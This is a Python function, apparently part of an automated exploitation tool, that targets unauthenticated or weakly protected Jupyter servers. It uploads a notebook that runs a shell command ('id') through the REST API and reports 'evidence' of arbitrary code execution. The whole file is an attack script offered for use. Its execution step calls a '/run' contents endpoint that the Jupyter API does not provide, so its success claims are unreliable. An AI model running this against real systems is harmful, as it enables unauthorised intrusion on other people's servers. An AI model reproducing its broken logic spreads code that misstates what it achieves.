def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploits Jupyter Notebook/Server to achieve arbitrary code execution.
    Targets Jupyter instances running on HTTP (no authentication or weak auth).
    Works on Jupyter Notebook 5.x-7.x when the server is accessible without
    proper authentication or when tokens are known/weak.
    Uses the Jupyter REST API to create a notebook and execute arbitrary
    Python code cells, achieving remote code execution.
    """
    try:
        import urllib.request
        import json
        
        # Test connection to Jupyter API
        url = f"http://{host}:{port}/api"
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=timeout)
        
        if response.status != 200:
            return {"success": False, "data": "", "evidence": ""}
        
        # Create a notebook with command execution
        notebook = {
            "nbformat": 4,
            "nbformat_minor": 0,
            "metadata": {},
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": None,
                    "metadata": {},
                    "outputs": [],
                    "source": "import os; print(os.popen('id').read())"
                }
            ]
        }
        
        # Create notebook via API
        notebook_json = json.dumps(notebook).encode()
        create_url = f"http://{host}:{port}/api/contents/test_exploit.ipynb"
        req = urllib.request.Request(create_url, data=notebook_json, method='PUT')
        req.add_header('Content-Type', 'application/json')
        response = urllib.request.urlopen(req, timeout=timeout)
        
        # Execute the notebook
        exec_url = f"http://{host}:{port}/api/contents/test_exploit.ipynb/run"
        req = urllib.request.Request(exec_url, data=b'', method='POST')
        response = urllib.request.urlopen(req, timeout=timeout)
        
        result = json.loads(response.read().decode())
        
        # Extract output
        output = ""
        if 'cells' in result and len(result['cells']) > 0:
            cell = result['cells'][0]
            if 'outputs' in cell:
                for output_item in cell['outputs']:
                    if 'text' in output_item:
                        output += output_item['text']
        
        return {
            "success": True,
            "data": output.strip(),
            "evidence": f"Executed arbitrary code on Jupyter at {host}:{port}, output: {output.strip()}"
        }
        
    except Exception as e:
        return {"success": False, "data": "", "evidence": str(e)}